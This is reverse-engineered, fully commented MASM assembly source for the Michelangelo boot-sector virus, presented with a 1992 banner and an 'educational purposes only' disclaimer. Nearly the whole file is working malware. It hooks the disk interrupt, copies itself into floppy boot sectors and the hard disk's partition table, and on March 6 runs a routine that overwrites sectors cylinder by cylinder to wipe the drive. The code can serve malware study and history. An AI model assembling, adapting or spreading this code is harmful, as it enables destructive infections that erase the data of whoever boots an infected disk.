        TITLE   MICHELANGELO, a STONED - derived Boot Virus
        SUBTTL  reverse engineered source code for MASM 5.1/6.0

         PAGE   60,132
        .RADIX  16

	IF1
         %Out    ÉÍ VIRAL SOFTWARE, DO NOT DISTRIBUTE WITHOUT NOTIFICATION Í»
         %Out    º°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°º
         %Out    º°°°°°°°°°°°°°°°ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿°°°°°°°°°°°°°°°°º
         %Out    º°°ÄÄÄÄÄÄÄÄÄÄÄÄÄ´ M I C H E L A N G E L O ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ°°º
         %Out    º°°°°°°°°°°°°°°°ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°°°°°°°°°°°°°°°º
         %Out    º°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°º
         %Out    ÈÍÍ Layout (C) 1992 164A12565AA18213165556D3125C4B962712 ÍÍ¼
	ENDIF
	
        comment #

  !									     !
  !     MICHELANGELO di Ludovico Buonarroti Simoni, born March 6, 1475,      !
  !     Caprese, Republic of Florence ...                                    !
  !     This boot block / partition table virus will overwrite most of the   !
  !     data on eiter floppy disks or winchester drives at HIS birthday.     !
  !	                                                                     !
  !	This source code may only be used for educational purposes!          !
  !	                                                                     !
  !	Do not offend the law by distributing viral or trojan horse soft-    !
  !	ware to anybody who is not aware of the potential danger of the      !
  !	software he receives.                                                !
  !                                                                          !

        #

        B       equ     <BYTE>
        D       equ     <DWORD>
        O       equ     <OFFSET>
        P       equ     <PTR>
        S       equ     <SHORT>
        T       equ     <THIS>
        v       equ     <OR>
        W       equ     <WORD>


  SAVE          MACRO     _1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c
                 IRP  _X,<_1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c>
                  IFNB   <_X>
                   IFIDN <_X>,<F>
                    PUSHF
                   ELSE
                    PUSH _X
                   ENDIF
                  ENDIF
                 ENDM
                ENDM

  REST          MACRO     _1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c
                 IRP  _X,<_1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c>
                  IFNB   <_X>
                   IFIDN <_X>,<F>
                     POPF
                   ELSE
                     POP _X
                   ENDIF
                  ENDIF
                 ENDM
                ENDM

  MOV_S         MACRO   S1,S2
                 SAVE   S2
                 REST   S1
                ENDM

TEXT    SEGMENT PARA PUBLIC 'CODE'

        ASSUME  CS:TEXT,DS:TEXT,ES:TEXT

        ORG     0

  MICHELANGELO  =       0306                    ; ... his BCD birthday
                                                ;
  SECSIZE       =       0200                    ;
  WINCHESTER1   =       80                      ;
  bREAD         =       2                       ;
  wREAD         =       bREAD SHL 8             ;
  bWRITE        =       3                       ;
  wWRITE        =       bWRITE SHL 8            ;
                                                ;
  DTA           =       T B + SECSIZE           ;
                                                ;
  OR13OFF       =       T W + 04C               ;
  OR13SEG       =       T W + 04E               ;
  SYSRAM        =       T W + 413               ;
  MOSTAT        =       T B + 43F               ;
                                                ;
  PARTTBL       =       T B + 1BE               ;
                                                ;
  OFSFRM0       EQU     7C00                    ;
                                                ;
START:          JMP       INIT                  ;
                                                ;
; -----------------------------------------------------------------------------
                                                ;
SHDWRELOCOFS    =       T W + OFSFRM0           ;
RELOCOFS        DW      FRSTRLCTD               ; Used by an indirect far jmp
SHDWRELOCSEG    =       T W + OFSFRM0           ;   to the relocated code.
RELOCSEG        DW      ?                       ;
                                                ;
HEADS           DB      ?                       ;
                                                ;
CYLSEG          DW      ?                       ;
                                                ;
SHDW13OFS       =       T W + OFSFRM0           ;
BIOS13OFS       DW      ?                       ; Holds original (BIOS)
SHDW13SEG       =       T W + OFSFRM0           ;   int 13 vector.
BIOS13SEG       DW      ?                       ;
                                                ;
; -----------------------------------------------------------------------------
                                                ;
I13_ISR:        SAVE    DS,AX                   ; INT 13 SR, save regs
                OR      DL,DL                   ; drive == A ?
                JNZ     I13_EX                  ;   jmp if not
                XOR     AX,AX                   ; DS = 0
                MOV     DS,AX                   ;
                TEST    B P [MOSTAT],01         ; test diskette motor status:
                JNZ     I13_EX                  ;   jmp if motor is already on
                REST    AX,DS                   ;
                SAVE    F                       ; call old interrupt 13
                CALL    D P CS:[BIOS13OFS]      ;  routine
                SAVE    F                       ; save FLAGS
                CALL    TstInfF                 ; test & infect if necessary
                REST    F                       ; restore FLAGS
                RETF    2                       ; return, preserve FLAGS
                                                ;
I13_EX:         REST    AX,DS                   ; restore regs, jmp to old int
                JMP     D P CS:[BIOS13OFS]      ;   13h routine
                                                ;
TstInfF:        SAVE    AX,BX,CX,DX,DS,ES,SI,DI ;
                MOV_S   DS,CS                   ; ES = DS = CS;
                MOV_S   ES,CS                   ;
                MOV     SI,0004                 ; SI = 4 (maxretry counter)
  @@:           MOV     AX,wREAD v 1            ; AX : read one sector
                MOV     BX,O DTA                ; BX : ... to buffer at CS:200
                MOV     CX,0001                 ; CX : ... cylinder 0, sector 1
                XOR     DX,DX                   ; DX : ... drive 0, head 0
                SAVE    F                       ; call old int13 routine by
                CALL    D P [BIOS13OFS]         ;   simulating an interrupt
                JNB     @F                      ; jmp if there isn't an error,
                XOR     AX,AX                   ; else reset disk system ...
                SAVE    F                       ;
                CALL    D P [BIOS13OFS]         ;
                DEC     SI                      ; decrement maxretry counter
                JNZ     @B                      ; try it again if not zero,
                JMP     S TstInfF_EX            ; else jmp to exit in haste.
                                                ;
  @@:           XOR     SI,SI                   ; boot sector has been read,
                CLD                             ; now test if disk already has
                LODSW                           ; been infected. Assume infect-
                CMP     AX,[BX]                 ; ion if the first 4 bytes of
                JNZ     @F                      ; MICHI and the boot sector are
                LODSW                           ; identical ...
                CMP     AX,[BX+02]              ;
                JZ      TstInfF_EX              ; exit, disk already infected
  @@:           MOV     AX,wWRITE v 1           ; AX : Write one sector
                MOV     DH,01                   ; DH : Head 1
                MOV     CL,03                   ; CL : Sector 3
                CMP     B P [BX+15],0FDH        ; adjust CL to E if the MEDIA ID
                JZ      @F                      ;  field of the original boot
                MOV     CL,0E                   ;  sector is not FD (5.25",360K)
  @@:           MOV     [CYLSEG],CX             ; store CX
                SAVE    F                       ; and write the original boot
                CALL    D P [BIOS13OFS]         ;   sector to the floppy disk
                JB      TstInfF_EX              ; if an error occured,
                MOV     SI,O PARTTBL + SECSIZE  ;         exit in haste.
                MOV     DI,O PARTTBL            ; Copy the last bytes of
                MOV     CX,0021                 ;   the original boot sector to
                CLD                             ;   the end of MICHI
                REP     MOVSW                   ;
                MOV     AX,wWRITE v 1           ; ... and write it to the boot
                XOR     BX,BX                   ;   sector of the disk.
                MOV     CX,0001                 ;
                XOR     DX,DX                   ;
                SAVE    F                       ;
                CALL    D P [BIOS13OFS]         ;
TstInfF_EX:     REST    DI,SI,ES,DS,DX,CX,BX,AX ; restore regs
                RET                             ; ... return
                                                ;
; -----------------------------------------------------------------------------
                                                ;
INIT:           XOR     AX,AX                   ; Set DS and SS to 0000,
                MOV     DS,AX                   ;  initialize SP to 7C00.
                CLI                             ;  That's because the boot
                MOV     SS,AX                   ;  sector will loaded into
                MOV     AX,OFSFRM0              ;  memory at 0:7C00 on every
                MOV     SP,AX                   ;  IBM clone ...
                STI                             ;
                                                ;
                SAVE    DS,AX                   ; save (0000:7C00) on stack
                                                ;
                MOV     AX,[OR13OFF]            ; Read old interrupt 13h vector
                MOV     [SHDW13OFS],AX          ;        and save it
                MOV     AX,[OR13SEG]            ;
                MOV     [SHDW13SEG],AX          ;
                                                ;
                MOV     AX,[SYSRAM]             ; Substract 2 from base memory
                DEC     AX                      ;   size variable in BIOS data
                DEC     AX                      ;   area
                MOV     [SYSRAM],AX             ;
                                                ;
                MOV     CL,06                   ; ES = AX = segment part of huge
                SHL     AX,CL                   ;   ptr to area 2KB below last
                MOV     ES,AX                   ;   base memory location
                                                ;
                MOV     [SHDWRELOCSEG],AX       ; Store seg for ind far jmp
                                                ;   to relocated code
                MOV     AX,O I13_ISR            ; Store ptr to new interrupt
                MOV     [OR13OFF],AX            ;   13 service routine to
                MOV     [OR13SEG],ES            ;   interrupt table,
                MOV     CX,O PARTTBL            ; Relocate code,
                MOV     SI,OFSFRM0              ;
                XOR     DI,DI                   ;
                CLD                             ;
                REP     MOVSB                   ;
                JMP     D P CS:[SHDWRELOCOFS]   ; Jmp to FRSTRLCTD (relo-
                                                ;   cated code)(BUGGY)
                                                ;
FRSTRLCTD:      XOR     AX,AX                   ; Reset the disk system
                MOV     ES,AX                   ;
                INT     13                      ;
                MOV_S   DS,CS                   ; ES = 0; DS = CS;
                MOV     AX,wREAD v 1            ; AH = 'Read', AL = # to read
                MOV     BX,OFSFRM0              ; ES:BX = 0:7C00 = xfer address
                MOV     CX,[CYLSEG]             ; CH = cylinder #, CL = sector #
                                                ;
                CMP     CX,+07                  ; Booted from winchester drive?
                JNZ     @F                      ;       jmp if not
                MOV     DX,0000 v WINCHESTER1   ; DH = head 0, DL = drive C
                INT     13                      ; read the original boot sector
                JMP     S BOOTNOW               ;   and jmp
                                                ;
  @@:           MOV     CX,[CYLSEG]             ; adjust cylinder/sector #s
                MOV     DX,0100                 ; DH = head 1, DL = drive A
                INT     13                      ; and read the sector ...
                JB      BOOTNOW                 ; (jmp on error, else continue)
                MOV_S   ES,CS                   ; ES = CS;
                MOV     AX,wREAD v 1            ; read partition table of 1st
                MOV     BX,O DTA                ; hard disk into buffer located
                MOV     CX,0001                 ; just after the relocated code
                MOV     DX,0000 v WINCHESTER1   ;
                INT     13                      ;
                JB      BOOTNOW                 ; (jmp on error, else continue)
                XOR     SI,SI                   ;
                CLD                             ; test if hard disk is already
                LODSW                           ; infected by comparing the 1st
                CMP     AX,[BX]                 ; four bytes, if these are
                JNZ     INFECT_PARTTBL          ; identical assume that the
                LODSW                           ; hard disk already is infected
                CMP     AX,[BX+02]              ; and continue, else jmp to
                JNZ     INFECT_PARTTBL          ; infect procedure
                                                ;
BOOTNOW:        XOR     CX,CX                   ; read date from real time clock
                MOV     AH,04                   ; (will _not_ work on old BIOSes
                INT     1A                      ;  that do not implement it)
                CMP     DX,MICHELANGELO         ; jmp if today is the
                JZ      BIRTHDAY                ;   birthday of MICHELANGELO
                RETF                            ; 'return' to original boot sec-
                                                ;   tor code
                                                ;
; -----------------------------------------------------------------------------
                                                ;
BIRTHDAY:       XOR     DX,DX                   ; DH = head 0; DL = drive A
                MOV     CX,0001                 ; CH = cylinder 0; CL = sector 1
BIRTHDAY_LOOP:  MOV     AX,wWRITE v 9           ; AH = 'Write'; AL = # of sectrs
                MOV     SI,[CYLSEG]             ; adjust AL ( # of sectors) and
                CMP     SI,+03                  ; DL (drive code) depending on
                JZ      @F                      ; the type of the current boot
                MOV     AL,0E                   ; disk
                CMP     SI,+0E                  ;
                JZ      @F                      ;
                MOV     DL,WINCHESTER1          ;
                MOV     B P [HEADS],04          ;
                MOV     AL,11                   ;
  @@:           MOV     BX,5000                 ; ES:BX -> 'Buffer' = 5000:5000
                MOV     ES,BX                   ;
                INT     13                      ;
                JNB     @F                      ;
                XOR     AH,AH                   ; reset disk system if an error
                INT     13                      ;   occured
  @@:           INC     DH                      ; increment head (DH)
                CMP     DH,[HEADS]              ; head < maxhead? continue if
                JB      BIRTHDAY_LOOP           ;   equal, else loop
                XOR     DH,DH                   ;
                INC     CH                      ; increment cylinder and loop
                JMP     BIRTHDAY_LOOP           ; ( goodbye data - cu never )
                                                ;
; -----------------------------------------------------------------------------
                                                ;
INFECT_PARTTBL: MOV     CX,0007                 ; It's an HD, take sector 7 to
                MOV     [CYLSEG],CX             ;   save the original partition
                MOV     AX,wWRITE v 1           ;   table and write it to disk
                MOV     DX,0000 v WINCHESTER1   ;
                INT     13                      ;
                JB      BOOTNOW                 ; jmp on error
                MOV     SI,O PARTTBL + SECSIZE  ; copy partition informa-
                MOV     DI,O PARTTBL            ;   tion to the end of MICHI
                MOV     CX,0021                 ;
                REP     MOVSW                   ;
                MOV     AX,wWRITE v 1           ; and write MICHI to the first
                XOR     BX,BX                   ;   sector of the hard disk ...
                INC     CL                      ;
                INT     13                      ;
                JMP     BOOTNOW                 ;
                                                ;
; -----------------------------------------------------------------------------
                                                ;
                ORG     SECSIZE - 2             ; Bootblock / partition table /
                DB      055,0AA                 ; ROM signature
                                                ;
; -----------------------------------------------------------------------------

TEXT    ENDS

END     START
